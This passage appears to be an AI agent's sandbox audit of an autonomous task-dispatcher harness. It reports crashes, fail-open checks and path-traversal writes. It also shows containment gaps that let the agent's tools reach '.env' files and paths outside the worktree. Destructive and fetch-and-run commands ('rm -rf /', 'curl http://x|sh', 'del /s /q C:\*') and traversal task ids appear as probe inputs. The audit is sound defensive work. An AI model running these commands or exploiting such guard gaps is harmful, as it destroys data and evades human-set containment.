    - Recurrent error: `at least one ISC criterion must have an executable '| Verify:' method`.
  - Impact: historical/task-state contract is inconsistent; downstream tooling has to branch on many shapes and can silently skip work.
  - Fix: run migration/repair pass on backlog rows and enforce one canonical schema at write time (including terminal statuses).

- **HIGH**: Single malformed JSON line in backlog can crash dispatcher startup - `tools/scripts/jarvis_dispatcher.py` (`read_backlog`)
  - Dynamic evidence:
    - Backlog probe file with one valid line + one malformed line (`{`).
    - Running `jarvis_dispatcher.py --dry-run` exits `1` with unhandled `json.decoder.JSONDecodeError`.
  - Impact: one corrupt row can stop all autonomous scheduling until manual file repair (queue-wide DoS).
  - Fix: make backlog loader robust per-line (`try/except JSONDecodeError`, quarantine bad lines, continue processing valid tasks, emit alert).

- **HIGH**: Pending task missing `id` crashes selection path via `deliverable_exists()` - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Backlog probe with one pending row lacking `id`.
    - `jarvis_dispatcher.py --dry-run` exits `1` with traceback:
      - `deliverable_exists -> branch_name = f"jarvis/auto-{task['id']}" -> KeyError: 'id'`.
  - Impact: single schema-drift row without `id` can hard-stop scheduling loop (queue-wide DoS).
  - Fix: enforce required-field validation on read (or skip/quarantine rows missing `id`) before selection logic.

- **HIGH**: Production backlog currently contains duplicate task IDs across different tasks - `orchestration/task_backlog.jsonl`
  - Dynamic evidence:
    - Scan result: `72` rows, `68` unique ids, duplicate id `task-1775467802350228` appears `5` times.
    - Those rows carry different descriptions (steering audit, prediction pipeline, weekly review, calibration, branch cleanup) but same id.
  - Impact: dependency/status tracking by id becomes ambiguous; tools expecting id uniqueness can mis-route or overwrite task state.
  - Fix: run one-off backlog ID repair/migration immediately; then enforce uniqueness on append and reject duplicate ids at write time.
  - Code-level contributor:
    - `backlog_append()` currently dedups by `routine_id` only; it does not reject caller-supplied duplicate `id` values already present in backlog.
  - Runtime consequence proven:
    - `all_deps_met()` is order-dependent when IDs collide:
      - same dependency id, same rows, different order -> dependency check flips `false`/`true`.
    - `select_next_task()` then selects different tasks under identical logical backlog content when duplicate-id row order changes.
  - Additional reproducer:
    - `backlog_append()` accepts duplicate caller-supplied ids in sequence (`rows=2`, both `id='dup-probe'` in probe backlog).

- **LOW**: `backlog_dashboard.py` surfaces duplicate IDs but does not flag integrity breach
  - Dynamic evidence:
    - `backlog_dashboard.py --json` includes repeated `task-1775467802350228` entries in output with no duplicate-id warning field.
  - Impact: operators can miss queue integrity issues unless manually scanning IDs.
  - Fix: add explicit duplicate-id detection/alert in dashboard stats.

- **MEDIUM**: Routine ISC verify commands include unschedulable entries (blocked or unsanitizable) - `orchestration/routines.json`
  - Dynamic evidence:
    - Harness: `_codex_scratch/verify_command_audit.json` (classification via `classify_verify_method()` + `sanitize_isc_command()`)
    - Result: `31` verify commands scanned -> `4` problematic:
      - blocked Python inline verifies
      - executable but unsanitized grep/pipe variants
  - Impact: routines are injected but repeatedly skipped/never selected; scheduler health appears idle while intended checks never execute.
  - Fix: replace blocked/unsanitizable verify commands with allowlisted deterministic script verifiers.

- **MEDIUM**: Non-executable verify criteria are widespread in active backlog rows
  - Dynamic evidence:
    - Backlog audit found `12` problematic rows, including `9` still `pending`, with blocked or unsanitized `| Verify:` commands.
    - One pending row has `verifiable=0` (cannot be selected by dispatcher at all).
  - Impact: queue appears populated but substantial subset is non-runnable under current verifier policy.
  - Fix: add backlog hygiene pass that rewrites/flags unsanitizable verify criteria before tasks enter `pending`.

- **MEDIUM**: Event rotation can silently no-op due stale absolute `root_dir` config - `heartbeat_config.json` + `tools/scripts/rotate_events.py`
  - Dynamic evidence:
    - `rotate_events.py` dry-run/execute both reported `No event files found.` despite populated `history/events/` in runtime repo.
    - `heartbeat_config.json` sets `root_dir` to hardcoded `C:/Users/ericp/Github/epdev`.
    - Control run with local override config (`root_dir='.'`) immediately found files and performed rollup/gzip as expected.
  - Impact: log retention/rollup jobs can appear healthy while never rotating active event files on non-original hosts.
  - Fix: default `root_dir` to repo-relative `.` for portability, or validate configured root existence and fail loudly.

- **MEDIUM**: Hardcoded host paths are still pervasive and operationally risky
  - Dynamic evidence:
    - Repo-wide scan for `C:/Users/ericp` style paths finds dozens of references across runtime config/scripts (`.claude/settings.json`, `heartbeat_config.json`, `orchestration/routines.json`, many `tools/scripts/run_*.bat`, and task backlog rows).
    - Runtime-critical subset count:
      - `.claude/settings.json`: `9`
      - `heartbeat_config.json`: `1`
      - `orchestration/routines.json`: `11`
      - `orchestration/task_backlog.jsonl`: `43`
    - Scheduler wrapper subset:
      - `run_*.bat` files with hardcoded `C:\\Users\\ericp...` references: `20` scripts (multiple refs each).
      - Runtime check in sandbox (`run_dispatcher.bat`, `run_heartbeat.bat`, `run_event_rotation.bat`) failed immediately with `The system cannot find the path specified.`
  - Impact: non-original hosts hit silent no-op behavior, missing hooks, or wrong target roots depending on which path is consumed at runtime.
  - Fix: centralize root discovery (`REPO_ROOT`) and prohibit user-specific absolute paths in tracked runtime configs/scripts.

- **MEDIUM**: Unknown routine schedule types fail open and still inject tasks - `tools/scripts/jarvis_dispatcher.py` routine scheduler
  - Dynamic evidence:
    - Sandbox routine with typo schedule type `wekly` (not a valid schedule enum)
    - Dispatcher dry-run still logs `Routine injected: typo-schedule-test`.
  - Impact: config typos can silently convert to “always due” behavior and spam backlog/task churn.
  - Fix: unknown schedule types should fail closed (warn + skip), not default to due.

- **MEDIUM**: `inject_routines()` ignores `schedule.type` semantics and accepts invalid intervals - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence (isolated harness):
    - Routine with `schedule.type='monthly'` and `interval_days=1`, last injected yesterday, was injected today (behaves as plain day-interval, not monthly cadence).
    - Routine with `interval_days=-5` and `last_injected=today` was also injected immediately.
  - Impact: declared cadence semantics in `routines.json` are not enforced; malformed/invalid intervals can create over-injection and scheduler churn.
  - Fix: validate schedule schema (`type` enum semantics + `interval_days >= 1`) and apply type-aware due logic (weekly/monthly/nightly/interval).

- **MEDIUM**: Dedup-skip path advances routine `last_injected` even when no task is injected - `tools/scripts/jarvis_dispatcher.py` (`inject_routines`)
  - Dynamic evidence (isolated harness):
    - Routine was due (`state_before` 30 days old) but had an active pending row, so `backlog_append` dedup returned `None` (`Routine skipped (already active)`).
    - Despite no injection, state was updated to today (`state_after_dedup_skip`).
    - After clearing the active row and rerunning immediately, routine did not inject (`injected_second=0`, backlog still empty) because cadence was artificially advanced.
  - Impact: transient active-row dedup can suppress legitimate future injections for full interval window, causing silent routine starvation.
  - Fix: update `last_injected` only on successful injection (`result is not None`), not on dedup skip.

- **MEDIUM**: Non-numeric `interval_days` can throw TypeError and disable routine injection for that cycle - `tools/scripts/jarvis_dispatcher.py` (`inject_routines`)
  - Dynamic evidence:
    - Isolated probe with `interval_days: "7"` / `null` raised:
      - `TypeError: '<' not supported between instances of 'int' and 'str'`.
    - Dispatcher-level probe shows this is swallowed as warning:
      - `WARNING: inject_routines failed: '<' not supported ...`
      - dispatch then continues normal task flow.
  - Impact: malformed routine config silently disables routine injection while dispatcher still reports normal progress.
  - Fix: schema-validate/coerce `interval_days` to int at load time and fail closed per-routine (skip invalid routine, continue others).

- **MEDIUM**: Malformed `routine_state.json` value types can crash `inject_routines()` - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Probe with state entry `{"state-type-drift": {"date":"2026-04-10"}}` raised:
      - `TypeError: fromisoformat: argument must be str`
    - No routines were injected in that cycle.
  - Impact: single malformed state value can block routine scheduling pass and silently reduce automation throughput.
  - Fix: guard `date.fromisoformat()` with type checks (`isinstance(..., str)`), treat invalid types like malformed dates (skip entry, continue).

- **MEDIUM**: Malformed `followon_state.json` types can crash follow-on gating/emission path - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence (isolated harness):
    - Case `{"date": "<today>", "count": "1"}`:
      - `_followon_throttle_ok()` raises `TypeError: '<' not supported between instances of 'str' and 'int'`
      - `_emit_followon(...)` raises same TypeError.
    - Case root JSON list (`[]`):
      - `_followon_throttle_ok()` raises `AttributeError: 'list' object has no attribute 'get'`
      - `_emit_followon(...)` raises same AttributeError.
  - Impact: state-shape drift can throw runtime exceptions in follow-on path; in dispatcher loop this is swallowed as warning, silently suppressing deterministic follow-on emission.
  - Fix: validate/coerce follow-on state schema on load (`dict` root, numeric `count`) with safe defaults on type mismatch.

- **HIGH**: Follow-on throttle state writes are not concurrency-safe (race + permission failures) - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence (4 workers x 250 `_record_followon_emission` calls):
    - Multiple worker crashes with `PermissionError [WinError 5]` at `os.replace(tmp, FOLLOWON_STATE_FILE)`.
    - Final counter integrity failure: `expected_count=1000`, `actual_count=250`, `lost_updates=750`.
  - Impact: concurrent follow-on emissions can corrupt throttle accounting and throw runtime errors, causing nondeterministic gating behavior.
  - Fix: add file locking around read-modify-write of `followon_state.json` (or move to append-only/event-sourced counter) so updates serialize correctly.

- **MEDIUM**: `pending_review` TTL sweep ignores malformed `created` dates, allowing indefinite bypass of 7d/14d lifecycle gates - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Probe backlog with:
      - `pr-bad-date` (`status=pending_review`, `created='2026/04/01'` malformed),
      - `pr-valid-expired` control (`created` 20 days ago).
    - Sweep/apply result:
      - control task expired -> `status='failed'`, `failure_type='pending_review_ttl'`,
      - malformed-date task remains `status='pending_review'` with no alert/expiry metadata.
  - Impact: malformed date fields can silently evade pending-review auto-alert and auto-fail controls.
  - Fix: treat malformed `created` as policy violation (route to `manual_review`/`failed`) rather than silently skipping.

- **MEDIUM**: Expired pending-review archive records are overwrite-prone on duplicate task ids - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Two archival writes with same `id='archive-overwrite-probe'` wrote to identical path:
      - `data/pending_review_expired/archive-overwrite-probe.json`
    - Second write replaced first record contents (description changed from `first record` to `second record`).
  - Impact: forensic trail for repeated expiries/collisions can be lost; only latest record survives.
  - Fix: include timestamp or unique suffix in archive filename (or append JSONL) to preserve all expiry events.

- **HIGH**: `archive_expired_pending_review()` is path-traversal vulnerable via task id - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Crafted task id `../escape_pending_review_probe`.
    - Archiver wrote record to:
      - returned path: `data/pending_review_expired/../escape_pending_review_probe.json`
      - resolved path: `data/escape_pending_review_probe.json` (outside intended archive directory).
    - Absolute-path style id also escapes archive root:
      - id `C:/Users/Admin PC/epdev/data/abs_escape_probe`
      - resolved write path: `data/abs_escape_probe.json` (outside `pending_review_expired/`).
    - `tools/scripts/lib/backlog.validate_task()` currently accepts traversal-style ids unchanged (`id='../escape_pending_review_probe'` returns no validation errors), so this shape can enter normal task data paths.
    - `validate_task()` also accepts absolute-style ids unchanged (`id='C:/Users/Admin PC/epdev/data/abs_escape_probe'` returns no validation errors).
  - Impact: backlog/task-id injection can write files outside `pending_review_expired/`, violating archive-boundary assumptions and enabling file placement in broader `data/`.
  - Fix: sanitize task IDs for filename use (strict basename allowlist) or generate archive filenames independently from untrusted task id.

- **HIGH**: `save_run_report()` is path-traversal vulnerable via task id - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Crafted report `task_id='../escape_run_report_probe'`.
    - Writer returned path under `data/dispatcher_runs/../...` resolving to:
      - `data/escape_run_report_probe_<timestamp>.json` (outside `dispatcher_runs/`).
    - Absolute-path style task_id also escapes run-report root:
      - `task_id='C:/Users/Admin PC/epdev/data/abs_run_report_probe'`
      - resolved path: `data/abs_run_report_probe_<timestamp>.json` (outside `dispatcher_runs/`).
  - Impact: crafted task ids can place run-report files outside the designated run-report directory, breaking retention/monitoring assumptions and widening write surface in `data/`.
  - Fix: sanitize `task_id` before filename interpolation (basename allowlist), or derive report filename from safe UUID and store task_id only inside JSON payload.

- **LOW**: `save_run_report(path=...)` accepts arbitrary explicit paths outside run-report root - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Calling `save_run_report(report, path=<repo>/data/explicit_report_escape_probe.json)` writes successfully outside `RUNS_DIR`.
  - Impact: current internal callers may be trusted, but API contract is permissive; future caller drift can bypass run-report directory boundary.
  - Fix: enforce `path` containment under `RUNS_DIR` (or remove public `path` override outside controlled update flow).

- **MEDIUM**: `save_run_report()` filename can collide within same second and overwrite prior report - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - With frozen timestamp (`2026-04-10 02:30:00`) and same `task_id`, two sequential `save_run_report()` calls returned identical path:
      - `.../dispatcher_runs/same-second-collision_20260410_023000.json`
    - Second write replaced prior payload (`marker: first -> second`).
  - Impact: burst writes for same task within one-second granularity can lose earlier report snapshots.
  - Fix: add higher-resolution entropy to filename (microseconds/UUID/monotonic counter) and keep overwrite only for explicit update mode.

- **MEDIUM**: Negative `followon_state.count` bypasses daily throttle indefinitely - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Seeded `followon_state.json` with `{date: today, count: -999}`.
    - Three consecutive checks/emissions all reported throttle OK (`true,true,true`), final count remained negative (`-996`).
  - Impact: malformed state can disable 1/day throttle and allow unbounded follow-on emission.
  - Fix: coerce/validate count to non-negative int on load; reset invalid values to `0`.

- **MEDIUM**: One malformed routine-state entry can starve all other routines in same cycle - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Probe config with two routines:
      - first routine state malformed (non-string),
      - second routine state valid and due.
    - `inject_routines()` raised `TypeError: fromisoformat: argument must be str` before processing second routine.
    - Result: `backlog_rows=0` (valid due routine not injected).
  - Impact: a single corrupt state row can globally block routine intake, not just the affected routine.
  - Fix: isolate per-routine state parse failures (catch `TypeError`/`ValueError` around each routine) and continue processing remaining routines.

- **MEDIUM**: Unknown routine condition types fail open and still inject - `tools/scripts/jarvis_dispatcher.py` (`_eval_routine_condition`)
  - Dynamic evidence (isolated harness):
    - Routine with typo condition type `file_count_mni` logs warning:
      - `unknown routine condition type 'file_count_mni' -- allowing injection`
    - Same run still injects task (`Routine injected: condition-typo-probe`).
  - Impact: condition typos silently convert guardrails into permissive mode, causing unintended routine execution.
  - Fix: unknown condition types should fail closed (skip injection + explicit error), with optional strict schema validation at startup.

- **MEDIUM**: Malformed condition values can raise and abort all routine injection - `tools/scripts/jarvis_dispatcher.py` (`_eval_routine_condition` / `inject_routines`)
  - Dynamic evidence:
    - Probe with `condition: {"type":"file_count_min","min":"abc"}` raised:
      - `ValueError: invalid literal for int() with base 10: 'abc'`
    - Same pass contained a second valid routine (`type: always`) that was not injected (`backlog_rows=0`).
  - Impact: one malformed routine condition can globally starve routine intake for that cycle.
  - Fix: wrap per-routine condition evaluation in exception handling; on error, skip only that routine and continue others.

- **MEDIUM**: Routine scheduler accepts `interval_days=0` and can reinject same routine repeatedly on same day - `tools/scripts/jarvis_dispatcher.py` (`inject_routines`)
  - Dynamic evidence (isolated harness):
    - Configured single routine with `interval_days: 0`.
    - First `inject_routines()` injected one task.
    - After marking that task `done`, second `inject_routines()` (same day) injected again (`second_injected_count: 1`), producing two backlog rows for same `routine_id`.
  - Impact: bad config can create same-day routine churn and unnecessary dispatcher load; dedup does not prevent reinjection once prior row leaves active state.
  - Fix: validate `interval_days >= 1` at load time and reject invalid routines.

- **LOW**: Hook compact output still emits non-ASCII replacement glyphs on Windows path - `tools/scripts/hook_post_compact.py`
  - Dynamic evidence:
    - `invoke_hook.py --hook PostCompact ...` output contains replacement characters (`�`) in task summary text.
  - Impact: Windows console readability regression; same class as cp1252 hazards elsewhere.
  - Fix: normalize output to ASCII-safe symbols for terminal paths (`-`, `->`) or force UTF-8 console mode before emit.

- **LOW**: cp1252 sweep confirms broader glyph fragility (primary crash remains `voice_inbox_sync`) - multiple scripts
  - Dynamic evidence:
    - Harness: `_codex_scratch/cp1252_smoke.py` across 10 scripts
    - Result: `1` hard `UnicodeEncodeError` (`voice_inbox_sync.py`), plus replacement-glyph output in `ntfy_notify.py` stderr path.
  - Impact: most scripts survive cp1252 mode, but Unicode presentation remains inconsistent for Windows operators.
  - Fix: enforce ASCII-safe CLI text for autonomous paths or standardize UTF-8 console setup in launcher wrappers.

- **MEDIUM**: Health report undercounts operational failures by ignoring dispatcher failure hooks - `tools/scripts/query_events.py`
  - Dynamic evidence:
    - `query_events.py --json` reports `failure_count: 0`, `failure_rate: 0.0`.
    - Same event log contains `dispatcher.task_failed` events (`3` observed in `history/events/2026-04-10.jsonl`).
  - Impact: dashboard can report HEALTHY while dispatcher task failures are occurring; this weakens triage signal.
  - Fix: incorporate `dispatcher.task_failed` into failure metrics (or publish a separate failure lane in the health status computation).

- **MEDIUM**: Retry-pending tasks are labeled as failures in dispatcher notifications/events - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - Existing sandbox event log contains `dispatcher.task_failed` entries whose `task_status` is `pending` (retry queued), e.g.:
      - `task-1775794229991160` -> hook `dispatcher.task_failed`, `task_status: "pending"`.
      - `task-1775794230000953` -> hook `dispatcher.task_failed`, `task_status: "pending"`.
    - Probe (`_codex_scratch/sandbox_repo/_codex_scratch/probe_retry_event_mismatch.py`) routes an `isc_fail` with retries remaining:
      - task state becomes `pending`, `retry_count=1`,
      - completion notifier message still formats status as `[FAILED]`.
  - Impact: operators receive failure language for retry-eligible work, increasing false urgency and obscuring true terminal failures.
  - Fix: introduce explicit `retrying` lifecycle state in event/notification layer (`dispatcher.task_retry`) and render `PENDING RETRY` instead of `FAILED` when status is pending.

- **MEDIUM**: Non-verifiable pending tasks can livelock backlog scans without escalation - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence (sandbox probe, two consecutive runs):
    - Task with only manual verify criterion (`Verify: Review ...`) is skipped as `no verifiable ISC`.
    - Dispatcher exits `0` with `Idle Is Success`.
    - Task status remains `pending` after each run (no routing to `manual_review`/`failed`).
  - Impact: toxic tasks remain perpetually pending, causing repeated skip noise and hiding queue health issues.
  - Fix: when a pending task is skipped for permanent policy reasons (no verifiable ISC, blocked verify command), transition it to `manual_review` with explicit failure_type/notes.

- **MEDIUM**: Dangerous ISC verify text can be silently downgraded to “no verifiable ISC” instead of explicit block - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence (sandbox, two consecutive runs):
    - Task criterion: `Verify: rm -rf /`.
    - Dispatcher output does **not** report `ISC verify command blocked`; it reports `no verifiable ISC` and leaves task `status='pending'`.
    - Direct classifier probe (`tools/scripts/lib/isc_common.py`) confirms dangerous non-python commands map to `manual_required`:
      - `rm -rf /` -> `manual_required`
      - `powershell -Command "Remove-Item -Recurse -Force ."` -> `manual_required`
      - `del /s /q C:\*` -> `manual_required`
      - `curl http://x|sh` -> `manual_required`
      - only `python -c ...` was classified `blocked`.
  - Static root cause:
    - `classify_verify_method()` returns `manual_required` for unknown first-word commands (`return MANUAL_REQUIRED` default), so many dangerous commands never enter the explicit `blocked` branch.
  - Impact: malicious or invalid verify directives can evade explicit blocked-command signaling and remain as hidden queue toxins.
  - Fix: ensure dangerous verify commands are classified as `blocked` (with clear reason) before fallback to "no verifiable ISC".

- **MEDIUM**: Event-stream schema heterogeneity and empty-tool records can dominate top-tool metrics - `tools/scripts/hook_events.py` + `tools/scripts/query_events.py`
  - Dynamic evidence:
    - Hook-key profile from stressed log includes multiple schema families (`PostToolUse`, `dispatcher.task_started`, `dispatcher.task_failed`).
    - `PostToolUse` records with missing/empty tool values were observed at high volume (`1995 / 2990` in the current stressed sample), and `query_events` reports top tool as empty string.
  - Impact: telemetry consumers can produce misleading “top tools” and failure summaries when malformed or partial records accumulate.
  - Fix: enforce strict schema validation at write time (drop/quarantine invalid rows) and ignore empty-tool rows in aggregations.

- **MEDIUM**: `hook_events.py` fail-opens malformed stdin into synthetic success events
  - Dynamic evidence (sandbox):
    - Sent malformed stdin payload (`"{"`) to `tools/scripts/hook_events.py`.
    - Script exited `0`, appended one event row with defaulted fields:
      - `hook: "PostToolUse"`, `session_id: ""`, `tool: ""`, `success: true`, `input_len: 0`.
  - Impact: invalid hook payloads are silently converted into "successful" telemetry, polluting dashboards and masking upstream data-path failures.
  - Fix: reject malformed/empty payloads with nonzero exit or emit explicit `parse_error` event type (never default success semantics).

- **LOW**: Defensive tests cover only canonical validator schema and miss hook-shape payload bypass - `tests/defensive/test_injection_detection.py`
  - Dynamic evidence:
    - Existing stdin integration test sends only `{tool,input}` schema.
    - No test case asserts equivalent behavior for `{tool_name,tool_input}` payload family used by hook events.
    - `pytest -q tests/defensive/test_injection_detection.py` reports `no tests ran`; checks execute only when run as a script (`python tests/defensive/test_injection_detection.py`).
  - Impact: critical schema drift can ship undetected even when defensive tests pass.
  - Fix: convert script checks to pytest test functions and add paired assertions for both payload schemas.
  - Corroboration:
    - `tests/test_overnight_path_guard.py` currently passes (`31/31`) yet does not catch hook-shape schema bypass in validator entrypoint.

- **LOW**: Trust-topology containment tests miss prefix-sibling escape case - `tests/defensive/test_trust_topology.py`
  - Dynamic evidence:
    - Existing containment test checks only an obviously external path.
    - No case covers sibling-prefix paths (`.../epdev_evil`) or `../` traversal that still satisfy current naive `startswith` check.
  - Impact: the critical containment bug can pass defensive test suites unchecked.
  - Fix: add explicit negative tests for prefix-sibling and relative-parent traversal paths.

- **LOW**: Two path-guard test modules are currently non-runnable due import path bug - `tests/test_path_guard.py`, `tests/test_path_guard_edge.py`
  - Dynamic evidence:
    - Running either directly or via pytest fails collection with `ModuleNotFoundError: No module named 'overnight_path_guard'`.
    - Root cause: tests import `overnight_path_guard` as top-level module, but implementation lives at `tools/scripts/overnight_path_guard.py`.
  - Impact: intended edge-case regression coverage is dead unless test import path is fixed.
  - Fix: import from package path (`tools.scripts.overnight_path_guard`) or prepend `tools/scripts` in test setup.

- **LOW**: Hook defensive test timeout is brittle under realistic repo state - `tests/defensive/test_hooks.py`
  - Dynamic evidence:
    - Running `tests/defensive/test_hooks.py` in sandbox timed out at step invoking `hook_session_start.py` (15s timeout), raising `subprocess.TimeoutExpired`.
    - Same hook invocation path succeeds but often exceeds 15s when tasklist/session introspection is non-trivial.
  - Impact: false-negative test failures in slower or larger environments; noisy CI signal.
  - Fix: increase timeout or split heavy `hook_session_start` checks into lighter deterministic units + separate integration timing budget.

- **LOW**: Self-heal baseline checks are partially stale against current hook architecture - `tests/self_heal/test_baseline.py`
  - Dynamic evidence:
    - Baseline run: `37 passed / 5 failed`
    - Failing hook checks expect:
      - `PreToolUse(Bash)` matcher to `validate_tool_use.py`
      - `Stop` wired to `hook_learning_capture.py`
    - Current `.claude/settings.json` hook wiring differs (no Bash-only matcher, different Stop stack).
  - Impact: baseline test reports regressions that are architectural drift, not necessarily runtime breakage.
  - Fix: update baseline assertions to current hook contract (or version-pin baseline profiles by architecture epoch).

- **LOW**: Confirmed unreachable branch in dispatcher main loop - `tools/scripts/jarvis_dispatcher.py`
  - Dynamic evidence:
    - `vulture` high-confidence scan reports unreachable code at dispatcher loop tail.
    - Path: final `print("Dispatch complete...")` after `while True` where all paths return earlier.
  - Impact: minor maintenance noise (not user-visible correctness bug).
  - Fix: remove unreachable print or convert loop termination semantics to explicit `break` + single exit path.

- **LOW**: `backlog_append` warning flood under load obscures signal - `tools/scripts/lib/backlog.py` warning path
  - Dynamic evidence:
    - Concurrent append stress (`2000` appends) produced >`2000` repeated warnings:
      - `"autonomous_safe tier 1 but has no expected_outputs -- dispatcher will route to manual_review"`
  - Impact: high-volume operational runs become log-noisy; real anomalies are harder to spot.
  - Fix: rate-limit/dedupe repeated warnings (e.g., per condition/per batch) while retaining a summary count.

- **LOW**: `branch_lifecycle.py --help` does not show help; it runs report side effects instead
  - Dynamic evidence:
    - Running `python tools/scripts/branch_lifecycle.py --help` emitted a live branch report rather than usage/help text.
  - Impact: operator expectation mismatch and weaker CLI safety ergonomics.
  - Fix: use argparse with a real `--help` handler and keep report execution on explicit action flags.

### Harness/runtime issues faced (tracked)

- Could not create `C:\Users\ericp\...` path due host permissions; used command rewrite harness in `_codex_scratch/invoke_hook.py`.
- Hook simulation initially failed due unquoted rewritten path containing `Admin PC`; fixed by quoting script path in rewritten command.
- Windows spawn mode blocked multiprocessing from inline `python -c`; moved stress logic to dedicated script file.
- PowerShell in this runtime rejected `&&` chaining; switched to sequential commands.
- First hook-event stress payload used wrong field nesting (tool metadata empty); corrected payload to top-level `tool_name`/`tool_input` and reran before finalizing conclusions.
- Complex inline Python quoting in PowerShell caused parser breaks during malformed-input probing; moved probe to dedicated script for reproducible execution.
- Dispatcher rate-limit probe remains partially confounded by recurring post-worker `[WinError 2]` failure path (task fails after ISC pass before a clean rate-limit terminal path can be observed in dispatcher state).
- Root cause for repeated `[WinError 2]` in sandbox worker path: fake Claude shim was `.cmd`; Python `subprocess.run([...], shell=False)` could not launch it as `claude` in this environment.

### Additional continuation checks completed

- Hook simulation now covers all configured hook events (`UserPromptSubmit`, `PreToolUse`, `Notification`, `PostToolUse`, `PostCompact`, `Stop`) with runtime outputs captured.
- Synthesis pipeline anti-criterion validated in sandbox:
  - seeded 50 synthetic signals + valid synthesis -> both verifiers PASS
  - truncated synthesis with no supporting citations -> `verify_synthesis_recall.py` exits nonzero with explicit fail reasons.
- Routine target script dry-runs (sandbox) executed for runtime surface sampling:
  - `branch_lifecycle.py --json` -> returns branch inventory JSON (pass)
  - `prediction_event_generator.py --dry-run` -> generates domain plan without external calls (pass)
  - `prediction_backtest_producer.py --dry-run` -> Idle Is Success when all events run (pass)
  - `prediction_review_task.py --dry-run` -> Idle Is Success with explicit Slack preview text (pass)
  - `prediction_calibration.py --dry-run` -> threshold gate engages (`0/20`, no write) (pass)
- Re-ran backlog concurrent-write stress at production scale (`4 writers x 500`):
  - Integrity holds: `expected_records=2000`, `actual_records=2000`, `duplicate_ids=0`, `json_decode_errors=0`.
  - Observed side effect: very high warning volume for missing `expected_outputs` on each append (operator-noise risk).
- Hook session-cost writer concurrency control validated:
  - `_codex_scratch/sandbox_repo/_codex_scratch/hook_session_cost_stress.py` (`4x250`) -> `lost_lines=0`, `bad_json_lines=0`.
- Focused security tool sanity:
  - `pip-audit` (audit venv) -> no known dependency vulnerabilities.
  - Focused `bandit` scan on validator/safety scripts -> no findings in that scoped set.
- Dispatcher retry telemetry probe:
  - event stream shows `dispatcher.task_failed` rows with `task_status='pending'` for retry-eligible tasks.
  - notifier formatting probe shows retry-queued tasks rendered as `FAILED` instead of retry/pending state.
- Hook event malformed-input probe:
  - malformed stdin (`"{"`) to `hook_events.py` exits `0` and appends synthetic default success row (`tool=''`, `session_id=''`).
- Autonomous containment scope probes:
  - canonical validator payloads show `Grep`/`Glob` allow sibling and `../` paths outside `JARVIS_WORKTREE_ROOT`.
  - hook simulation confirms canonical `Grep` against `.env` is allowed in `PreToolUse`.
- Dispatcher no-verifiable-ISC liveness probe:
  - same pending task is skipped across consecutive runs with `Idle Is Success`; status remains `pending`.
- Blocked-verify liveness probe:
  - `Verify: rm -rf /` task is also skipped as `no verifiable ISC` (not explicit blocked-command), status remains `pending` across runs.
- ISC classifier dangerous-command probe:
  - non-python destructive verify commands default to `manual_required` (not `blocked`) in `isc_common`.
- Routine-template parity probe:
  - `weekly-synthesis` in `routines.json` uses `verify_synthesis_recall.py`, but active backlog rows still contain weaker `grep -ril signal ...` criterion.
- Routine interval-bound probe:
  - `interval_days=0` routine reinjects again same day once prior row is `done` (duplicate `routine_id` backlog rows).
- Routine schedule-semantics probe:
  - `schedule.type='monthly'` behaves as plain day-interval logic; `interval_days=-5` is accepted and injected immediately.
- Routine condition fail-open probe:
  - typo condition type still injects routine after warning (`unknown ... allowing injection`).
- Routine condition-value crash probe:
  - malformed `file_count_min.min` (`"abc"`) raises ValueError and aborts injection loop (other valid routines skipped).
- Routine interval type crash/recovery probes:
  - `interval_days` as string/null raises TypeError inside `inject_routines`; dispatcher catches and continues with warning.
- Routine state type-drift probe:
  - non-string `routine_state` timestamps raise `fromisoformat` TypeError and abort injection pass.
- Routine cross-starvation probe:
  - one malformed routine-state entry aborts `inject_routines`, preventing other valid due routines from injecting.
- Routine dedup-state drift probe:
  - dedup skip (`already active`) still advances `last_injected`, suppressing reinjection even after active row clears.
- Context-file guard probes:
  - `validate_context_files` allows `.env.local`, trailing-slash credential/pem variants, and sibling-path escapes.
  - `select_next_task` still selects pending tasks carrying those bypassed context files.
  - `generate_worker_prompt` includes bypassed context file contents (including synthetic secret values) in worker prompt body.
- Synthesis routine verifier false-pass probe:
  - queued signal + non-synthesis `memory/learning/synthesis/README.md` touched today still yields `PASS: synthesis doc created today`.
- Pending-review malformed-date bypass probe:
  - malformed `created` keeps task in `pending_review` while valid expired control auto-fails.
- Follow-on state malformed-type probe:
  - `count` as string or non-dict root causes exceptions in throttle/emission helpers.
- Follow-on negative-count bypass probe:
  - seeded negative count keeps throttle check true across repeated emissions (count stays negative).
- Follow-on state concurrency probe:
  - parallel `_record_followon_emission` causes `WinError 5` replace failures and large counter loss (`1000` expected vs `250` actual).
- Pending-review archive path traversal probe:
  - crafted task id with `../` escapes `pending_review_expired` and writes under parent `data/`.
  - absolute-path style task id also escapes archive root and writes under parent `data/`.
- Pending-review archive overwrite probe:
  - duplicate task id writes replace prior archive record at same filename.
- Run-report path traversal probe:
  - crafted `task_id` with `../` escapes `dispatcher_runs` and writes under parent `data/`.
  - absolute-path style `task_id` likewise escapes `dispatcher_runs`.
  - explicit `save_run_report(path=...)` also permits writes outside `dispatcher_runs`.
- Run-report same-second collision probe:
  - same `task_id` + same timestamp second produces identical filename and overwrites previous report payload.
- Backlog malformed-line crash probe:
  - one malformed JSONL row triggers unhandled JSONDecodeError and dispatcher exit 1.
- Missing-task-id crash probe:
  - pending row without `id` crashes in `deliverable_exists` with `KeyError: 'id'`.

### Continuation command log (added)

- `python _codex_scratch/rate_limit_probe.py` (monkeypatched subprocess mode)
